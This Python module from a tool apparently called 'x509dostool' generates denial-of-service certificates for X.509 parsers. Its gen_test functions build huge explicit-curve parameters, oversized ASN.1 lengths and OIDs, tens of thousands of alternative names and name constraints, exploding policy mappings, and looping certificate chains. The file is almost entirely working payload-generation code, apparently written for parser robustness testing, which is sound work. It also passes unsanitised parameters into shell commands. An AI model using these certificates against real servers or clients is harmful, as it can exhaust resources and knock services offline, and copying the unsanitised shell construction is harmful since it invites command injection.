#!/usr/bin/env python3

import os
import random
import itertools
import pkg_resources

from Crypto.Util.number import *

from .edit import *
from ..misc.misc import *

globals().update(load_config(pkg_resources.resource_filename('x509dostool', 'config.json')))

def fast_gen_normal_cert(type = DEFAULT_ALGO_TYPE, curve_name = DEFAULT_CURVE_NAME, explicit = DEFAULT_ECDSA_EXPLICIT, key_bits = DEFAULT_RSA_OR_DSA_KEY_BITS, common_name = DEFAULT_COMMON_NAME, out_path = DEFAULT_CERT_NAME, out_form = "der", tmp_dir = DEFAULT_TMP_DIR):
    cmd = ""

    if type == "rsa":
        cmd += f'''
            openssl genrsa -out {tmp_dir}private.key {key_bits}
        '''

    elif type == "dsa":
        cmd += f'''
            openssl dsaparam -genkey -out {tmp_dir}private.key {key_bits}
        '''

    elif type == "ecdsa":
        if explicit:
            cmd += f'''
                openssl ecparam -name {curve_name} -genkey -out {tmp_dir}private.key -noout -param_enc explicit
            '''

        else:
            cmd += f'''
                openssl ecparam -name {curve_name} -genkey -out {tmp_dir}private.key -noout
            '''

    else:
        alert("the algorithm must be one of rsa, dsa, or ecdsa.")

    cmd += f'''
        openssl req -new -x509 -key {tmp_dir}private.key -outform {out_form} -out {tmp_dir}{out_path} -days 360 -subj "/CN={common_name}"
    '''

    run_cmd(cmd)

def gen_config(num_alt_names, num_name_constraints, num_policies, mapping = True, tmp_dir = DEFAULT_TMP_DIR):
    # x509v3 config prefix
    config = '''[req]
req_extensions = v3_req
distinguished_name = dn_req

[ dn_req ]
CN = test
emailAddress = test@test.com

[v3_req]
basicConstraints = CA:TRUE
keyUsage = critical, digitalSignature, keyCertSign
extendedKeyUsage = serverAuth, clientAuth, emailProtection'''

    # add subjectAltName field
    if num_alt_names > 0:
        config += '''
subjectAltName = @alt_names'''

    # add nameConstraints field
    if num_name_constraints > 0:
        config += '''
nameConstraints = @name_constraints'''

    # add certificatePolicies field and its values
    if num_policies > 0:
        policies = []
        for i in range(num_policies):
            # see https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.4
            # see https://docs.openssl.org/master/man5/x509v3_config/#certificate-policies
            policies += [f"1.2.3.{i + 1}"]
        config += '''
certificatePolicies = ''' + ', '.join(policies)
        # add policyMappings field and its values
        if mapping == True:
            # this step will be very time-consuming when there are many elements in list policies
            cartesian_product_result = list(itertools.product(policies, repeat = 2))
            # see https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.5
            policy_mappings = [f"{x}:{y}" for x, y in cartesian_product_result]
            config += '''
policyMappings = ''' + ', '.join(policy_mappings)

    if num_alt_names > 0:
        # add actual values of subjectAltName field
        config += '''

[alt_names]'''
        # see https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.6
        # see https://docs.openssl.org/master/man5/x509v3_config/#subject-alternative-name
        # e.g. DNS / IP / email / URI / ...
        for i in range(num_alt_names):
            config += f'''
DNS.{i + 1} = {i + 1}'''

    if num_name_constraints > 0:
        # add actual values of nameConstraints field
        config += '''

[name_constraints]'''
        # see https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.10
        # see https://docs.openssl.org/master/man5/x509v3_config/#name-constraints
        # e.g. permitted / excluded
        for i in range(num_name_constraints):
            config += f'''
permitted;DNS.{i + 1} = {i + 1}'''

    # save the constructed config into a file.
    file = open(f"{tmp_dir}x509v3.cnf", "w")
    file.write(config + "\n")

def fast_gen_cert_chain(type = DEFAULT_ALGO_TYPE, curve_name = DEFAULT_CURVE_NAME, explicit = DEFAULT_ECDSA_EXPLICIT, key_bits = DEFAULT_RSA_OR_DSA_KEY_BITS, common_name = DEFAULT_COMMON_NAME, num_names = 0, num_alt_names = 0, num_name_constraints = 0, num_policies = 0, num_certs = 0, mapping = False, loop = False, out_form = 'pem', out_path = DEFAULT_CERT_NAME, tmp_dir = DEFAULT_TMP_DIR):
    # set the variables
    num_names, num_alt_names, num_name_constraints, num_policies, num_certs = map(expr_to_int, [num_names, num_alt_names, num_name_constraints, num_policies, num_certs])

    cmd = ""
    
    # generate the x509v3 configuration file
    gen_config(num_alt_names, num_name_constraints, num_policies, mapping, tmp_dir)

    if type == "rsa":
        gen_key_cmd = f"openssl genrsa -out {tmp_dir}private_$i.key {key_bits}"

    elif type == "dsa":
        gen_key_cmd = f"openssl dsaparam -genkey -out {tmp_dir}private_$i.key {key_bits}"

    elif type == "ecdsa":
        if explicit:
            gen_key_cmd = f"openssl ecparam -name {curve_name} -genkey -out {tmp_dir}private_$i.key -noout -param_enc explicit"

        else:
            gen_key_cmd = f"openssl ecparam -name {curve_name} -genkey -out {tmp_dir}private_$i.key -noout"

    else:
        alert("the algorithm must be one of rsa, dsa, or ecdsa.")

    # generate all materials
    # see https://datatracker.ietf.org/doc/html/rfc5280#section-4.1.2.6
    # e.g. CN / OU / O / L / emailAddress / ...
    cmd += f'''
        for ((i=1; i<={num_certs}; i++)); do
            {gen_key_cmd}
            openssl req -new -key {tmp_dir}private_$i.key -out {tmp_dir}request_$i.csr -subj "/CN={common_name}_$i$(for j in $(seq 1 {num_names}); do echo -n "/emailAddress=$((j))@test.com"; done)"
        done
    '''

    # generate a self-signed certificate for the first certificate
    cmd += f'''
        openssl x509 -req -in {tmp_dir}request_1.csr -signkey {tmp_dir}private_1.key -outform {out_form} -out {tmp_dir}certificate_1.crt -days 365 -extfile {tmp_dir}x509v3.cnf -extensions v3_req
    '''

    if num_certs > 1:
        # sign the remaining certificates
        cmd += f'''
            for ((i=2; i<={num_certs}; i++)); do
                prev=$((i - 1))
                openssl x509 -req -in {tmp_dir}request_$i.csr -CA {tmp_dir}certificate_$prev.crt -CAkey {tmp_dir}private_$prev.key -CAcreateserial -outform {out_form} -out {tmp_dir}certificate_$i.crt -days 365 -extfile {tmp_dir}x509v3.cnf -extensions v3_req -subj "/CN={common_name}_$i$(for j in $(seq 1 {num_names}); do echo -n "/emailAddress=$((j))@test.com"; done)"
            done
        '''

        if loop == True:
            # sign the first certificate with the key of the last certificate
            cmd += f'''
                openssl x509 -req -in {tmp_dir}request_1.csr -CA {tmp_dir}certificate_{num_certs}.crt -CAkey {tmp_dir}private_{num_certs}.key -CAcreateserial -outform {out_form} -out {tmp_dir}certificate_1.crt
        '''

        if out_form == "pem":
            # combine certificates into a certificate chain
            cmd += f'''
                > {out_path}
                for ((i={num_certs}; i>=1; i--)); do
                    cat {tmp_dir}certificate_$i.crt >> {out_path}
                done
            '''

    else:
        cmd += f'''
            cp {tmp_dir}certificate_1.crt {out_path}
        '''

    run_cmd(cmd)

def gen_test0(type, curve_name, explicit, compressed, out_path, out_form, tmp_dir):
    fast_gen_normal_cert(
                        type = type, 
                        curve_name = curve_name, 
                        explicit = explicit, 
                        tmp_dir = tmp_dir
    )

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    spki = cert['tbsCertificate']['subjectPublicKeyInfo']

    if type == 'ecdsa' and compressed:
        if explicit:
            set_ecdsa_public_key_explicitly(spki, compressed = True)
        else:
            set_ecdsa_public_key(spki, compressed = True)

    write_cert(cert, out_path, pem = (out_form == "pem"))

def gen_test1(m, balanced, compressed, out_path, out_form, tmp_dir):
    # https://neuromancer.sk/std/secg/sect233r1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "sect233r1", explicit = True, tmp_dir = tmp_dir)

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    spki = cert['tbsCertificate']['subjectPublicKeyInfo']

    if m is None:
        m = random.randint(0x7FFFFF, 0x7FFFFFFF)

    set_ecdsa_public_key_explicitly(spki, type = "f2m_tp", degree = m, balanced = balanced, compressed = compressed)
    write_cert(cert, out_path, pem = (out_form == "pem"))


def gen_test2(m, t, balanced, compressed, out_path, out_form, tmp_dir):
    # https://neuromancer.sk/std/secg/sect233r1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "sect233r1", explicit = True, tmp_dir = tmp_dir)
    
    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    spki = cert['tbsCertificate']['subjectPublicKeyInfo']

    if m is None:
        m = random.randint(112, 384)
    
    if t is None:
        t = random.randint(385, 571)
    
    set_ecdsa_public_key_explicitly(
                                    spki, type = "f2m_tp", 
                                    degree = m, t3 = t,
                                    balanced = balanced, compressed = compressed
    )
    write_cert(cert, out_path, pem = (out_form == "pem"))

def gen_test3(p, balanced, out_path, out_form, tmp_dir, a = None, b = None, G = None):
    # https://neuromancer.sk/std/x962/prime256v1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "prime256v1", explicit = True, tmp_dir = tmp_dir)

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    spki = cert['tbsCertificate']['subjectPublicKeyInfo']

    if p is None:
        b = 0
        while True:
            Gx = random.randint(2, 2**10)
            a = random.randint(2, 2**10)
            p = Gx**3 + a * Gx + b + 1
            if p % 8 == 1:
                q = p - 1
                while q % 2 == 0:
                    q //= 2
                if pow(Gx**3 + a * Gx + b, q, p) == p - 1:
                    break
        
        G = '03' + long_to_bytes(Gx).hex()

    set_ecdsa_public_key_explicitly(
                                    spki, type = "fp", 
                                    p = p, a = a, b = b, 
                                    G_hex = G, 
                                    balanced = balanced, compressed = True
    )
    write_cert(cert, out_path, pem = (out_form == "pem"))

def gen_test4(p, balanced, compressed, out_path, out_form, tmp_dir):
    # https://neuromancer.sk/std/x962/prime256v1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "prime256v1", explicit = True, tmp_dir = tmp_dir)

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    spki = cert['tbsCertificate']['subjectPublicKeyInfo']

    if p is None:
        # https://oeis.org/A000043
        exps = [21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269]
        p = f"2 ** {random.choice(exps)} - 1"

    set_ecdsa_public_key_explicitly(spki, type = "fp", 
                                    p = p,
                                    balanced = balanced, compressed = compressed
    )
    write_cert(cert, out_path, pem = (out_form == "pem"))

def gen_test5(num_emails, num_alt_names, num_name_constraints, num_policies, out_path, out_form, tmp_dir):
    if num_emails is None:
        num_emails = 0

    if num_alt_names is None:
        num_alt_names = 30000

    if num_name_constraints is None:
        num_name_constraints = 0

    if num_policies is None:
        num_policies = 0

    fast_gen_cert_chain(
                        num_names = num_emails,
                        num_alt_names = num_alt_names, 
                        num_name_constraints = num_name_constraints, 
                        num_policies = num_policies,
                        num_certs = 1,
                        out_form = out_form, 
                        out_path = out_path, 
                        tmp_dir = tmp_dir
    )

def gen_test6(length, out_path, out_form, tmp_dir):
    if length is None:
        length = 0x0500000000

    length_bytes = bytes.fromhex(expr_to_hex(length))

    if len(length_bytes) > 127:
        alert("the specified length in byte form should not exceed 127.")

    # https://neuromancer.sk/std/x962/prime256v1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "prime256v1", explicit = False, tmp_dir = tmp_dir)

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    subject = cert['tbsCertificate']['subject'][0][0]

    old_bytes = encoder.encode(subject[0][1])
    # new_bytes = b'\x0c' + b'\x02' + b'A' * 2 #bytes([0x80 + len(bytes_length)]) + length_bytes
    new_bytes = b'\x0c' + bytes([0x80 + len(length_bytes)]) + length_bytes

    edit_asn1_obj(
                    f"{tmp_dir}{DEFAULT_CERT_NAME}", 
                    out_path, out_form, 
                    idx = 12, 
                    hex_new_bytes = new_bytes.hex()
    )

def gen_test7(sub_id_encoded_length, out_path, out_form, tmp_dir):
    if sub_id_encoded_length is None:
        sub_id_encoded_length = 1000000
    
    sub_id_encoded_length = expr_to_int(sub_id_encoded_length)

    # https://neuromancer.sk/std/x962/prime256v1
    fast_gen_normal_cert(type = "ecdsa", curve_name = "prime256v1", explicit = False, tmp_dir = tmp_dir)

    cert = read_cert(f"{tmp_dir}{DEFAULT_CERT_NAME}")
    subject = cert['tbsCertificate']['subject'][0][0]

    old_bytes = encoder.encode(subject[0][0])
    #new_bytes = b'\x0c' + b'\x02' + b'A' * 2 #bytes([0x80 + len(bytes_length)]) + length_bytes
    new_bytes = b'\x06' + encode_length(sub_id_encoded_length + 2) + b'\x55' + b'\xff' * sub_id_encoded_length + b'\x7f'

    edit_asn1_obj(
                    f"{tmp_dir}{DEFAULT_CERT_NAME}", 
                    out_path, out_form, 
                    idx = 11, 
                    hex_new_bytes = new_bytes.hex()
    )

def gen_test8(num_certs, num_alt_names, num_name_constraints, out_path, out_form, tmp_dir):
    if num_certs is None:
        num_certs = 3

    if num_alt_names is None:
        num_alt_names = 30000

    if num_name_constraints is None:
        num_name_constraints = 30000

    fast_gen_cert_chain(
                        num_alt_names = num_alt_names, 
                        num_name_constraints = num_name_constraints, 
                        num_certs = num_certs,
                        out_path = out_path,
                        out_form = out_form, 
                        tmp_dir = tmp_dir
    )

def gen_test9(num_certs, num_policies, mapping, out_path, out_form, tmp_dir):
    if num_certs is None:
        num_certs = 30

    if num_policies is None:
        num_policies = 2

    fast_gen_cert_chain(
                        num_policies = num_policies, 
                        num_certs = num_certs,
                        mapping = mapping,
                        out_path = out_path,
                        out_form = out_form, 
                        tmp_dir = tmp_dir
    )

def gen_test10(num_certs, repeat, out_path, out_form, tmp_dir):
    if num_certs is None:
        num_certs = 3

    fast_gen_cert_chain(
                        num_certs = num_certs, 
                        loop = True, 
                        out_path = out_path,
                        out_form = out_form, 
                        tmp_dir = tmp_dir
    )

    if repeat is None:
        repeat = 2
    
    repeat = expr_to_int(repeat)

    if repeat > 0 and out_form == "pem":
        with open(out_path, "rb") as file:
            data = file.read()
        
        open(out_path, "wb").write(data * (repeat + 1))
